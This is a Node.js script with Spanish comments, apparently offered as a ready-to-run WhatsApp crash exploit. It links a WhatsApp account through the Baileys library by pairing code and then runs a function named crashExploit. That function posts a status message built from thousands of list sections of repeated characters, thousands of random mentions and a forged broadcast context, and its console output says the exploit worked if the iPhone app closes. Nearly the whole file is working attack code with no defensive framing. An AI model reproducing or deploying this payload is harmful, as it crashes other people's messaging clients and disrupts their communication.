const { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const P = require("pino");
const fs = require("fs");

// ========== LEE EL NÚMERO DESDE VARIABLE DE ENTORNO ==========
const PHONE_NUMBER = process.env.PHONE_NUMBER;
if (!PHONE_NUMBER) {
    console.error("❌ ERROR: Debes configurar PHONE_NUMBER en las variables de entorno.");
    console.error("📌 Ejemplo: PHONE_NUMBER=521234567890");
    process.exit(1);
}

console.log(`📱 Usando número: ${PHONE_NUMBER}`);

async function start() {
    const { state, saveCreds } = await useMultiFileAuthState("auth");
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: state,
        version,
        logger: P({ level: "silent" }),
        browser: ["Ubuntu", "Chrome", "120.0.0"]
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "open") {
            console.log("\n✅ Conectado a WhatsApp\n");
            await crashExploit(sock);
        }
        if (connection === "close") {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                console.log("🔄 Reconectando...");
                start();
            } else {
                console.log("🔒 Sesión cerrada. Elimina la carpeta auth y vuelve a intentar.");
            }
        }
    });

    if (!sock.authState.creds.registered) {
        try {
            const code = await sock.requestPairingCode(PHONE_NUMBER);
            console.log("\n🔑 Código de vinculación:", code);
            console.log("📲 Abre WhatsApp > Dispositivos vinculados > Vincular con código de 8 dígitos\n");
        } catch (e) {
            console.log("❌ Error al solicitar pairing:", e.message);
        }
    }
}

async function crashExploit(sock) {
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "〽",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🌀" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: "status@broadcast",
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            serverMessageId: 1,
                            newsletterName: "〽"
                        }
                    },
                    description: "〽"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent("status@broadcast", MSG, {});

    try {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: ["status@broadcast"],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: "status@broadcast" },
                        content: undefined
                    }]
                }]
            }]
        });
        console.log("\n💀 ¡Estado malicioso enviado! Abre WhatsApp en tu iPhone y ve al estado...");
        console.log("⚠️ Si la app se cierra, el exploit funcionó.");
    } catch (e) {
        console.log("❌ Error al enviar:", e.message);
    }
}

start();